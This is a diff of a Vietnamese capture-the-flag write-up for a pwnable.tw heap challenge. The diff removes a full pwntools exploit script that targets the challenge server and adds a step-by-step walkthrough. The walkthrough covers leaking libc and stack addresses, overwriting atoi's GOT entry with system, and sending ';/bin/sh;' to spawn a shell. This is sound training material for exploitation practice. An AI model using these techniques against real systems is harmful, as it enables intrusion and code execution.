@@ -57,7 +57,7 @@ Riêng `iPhone 8 - 1$` được lưu trên stack còn lại được lưu trên 
 
 # 3. Khai thác
 
-Đầu tiên cứ tiến đến phần được nhận iphone-8 đã
+- Bước 1: Nhận iphone-8 
 
 ```
 for i in range(6):
@@ -67,127 +67,65 @@ for i in range(20):
 checkout()
 ```
 
+- Bước 2: Leak libc, stack
+
 ![checkout.png](images/checkout.png)
 
-Có thể thấy riêng `iphone-8` có `fd` và `bk` trỏ ở stack
+Nhìn vào đây và nhìn vào hàm delete 
 
+![checkout2.png](images/checkout2.png)
 
+Do ở đây sẽ sử dụng con trỏ để in ra giá trị tại địa chỉ mà nó trỏ tới mỗi khi ta delete 1 item ấy(cụ thể là tên đã được gán khi cấp phát)
 
+Nhận ra khi người ta trao ip8 cho ta, con trỏ `v2` đã được cấp phát tại vị trí `ebp-0x20` mà tại `delete()` ta có quyền viết `0x15` ký tự tại địa chỉ `ebp-0x22`
 
+-> Toàn quyền thay đổi con trỏ ấy và mình đã dùng để leak địa chỉ libc cũng như địa chỉ stack
 
+- Bước 3: Get_shell
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Full code:
+OKe vậy đã có các giá trị, địa chỉ, ta sẽ xem thử các thanh ghi ở địa chỉ `ebp-0x20` làm gì
 
 ```
-#!/usr/bin/python3
-from pwn import *
-
-elf = context.binary = ELF("dubblesort_patched")
-libc = elf.libc
-
-local = False 
-if local:
-    p = process("./dubblesort_patched")
-    gdb.attach(p,'''
-    b*main+111
-    c
-    b*main+310''')
-else:
-    p = remote('chall.pwnable.tw', 10101)
-
-elf = context.binary = ELF('./dubblesort_patched', checksec=False)
-
-payload = b"a"*28
-p.sendlineafter(b"What your name :", payload)
-p.recvuntil(payload)
-
-libc_base = int.from_bytes(p.recv(4),"little") - 1769482
-system = libc_base + 0x3a940
-binsh = libc_base + 0x158e8b
-
-leak = int.from_bytes(p.recv(4),"little") + 1322
-main = leak + 360
-
-
-print("[+]Libc_base:    ", hex(libc_base))
-print("[+]System:         ", hex(system))
-print("[+]Bin_sh:         ", hex(binsh))
-
-p.sendlineafter(b"How many numbers do you what to sort :", b"35")
-
-def send_value(value):
-    p.sendlineafter(b" number :", str(value))
-
-for i in range(24):
-    send_value(str(i))
-
-p.sendlineafter(b" number :", b"-")
-for i in range(8):
-    p.sendlineafter(b" number :", str(system))
-p.sendlineafter(b" number :", str(system+1))
-p.sendlineafter(b" number :", str(binsh))
-
-p.interactive()
+delete(b"27" + cyclic(0x30))
 ```
 
+![gdb2.png](images/gdb2.png)
+
+Vậy là giá trị tại địa chỉ `ebp-0x14` sẽ lưu vào `[ebp-0x10]` + 8
+
+Và sau đó giá trị tại địa chỉ `ebp-0x10` sẽ lưu vào `[ebp-0x14]` + 12
+
+![gdb3.png](images/gdb3.png)
+
+Với điều kiện ấy, đầu tiên mình sẽ đưa `atoi@got.plt+0x22` vào `ebp` 
+
+Tại sao lại là `atoi@got.plt+0x22`?
+
+![eax.png](images/eax.png)
+
+Nhìn vào stack sau khi đưa vào ta có `lea eax, [ebp - 0x22]` và vì vậy `eax = atoi@got.plt`
+
+![myread.png](images/myread.png)
+
+Vậy là khi vào hàm `readme()`:
+
+`result` = `eax` = `atoi@got.plt`
+
+Những gì ta nhập tiếp sẽ lưu vào `atoi@got.plt`
+
+=> Mình sẽ ghi `system` vào đây 
+
+```
+p.sendline(p32(libc_system))
+```
+
+Sau khi đã ghi `system` vào `atoi@got.plt` thì những gì mình đã nhập vào sẽ theo đó thực thi
+
+=> thêm chuỗi `;/bin/sh;`: dấu `;` để ngăn cách `/bin/sh` với các command liền kề nó 
+
+```
+p.sendline(p32(libc_system) + b";/bin/sh;")
+```
+
+![flag.png](images/flag.png)
 
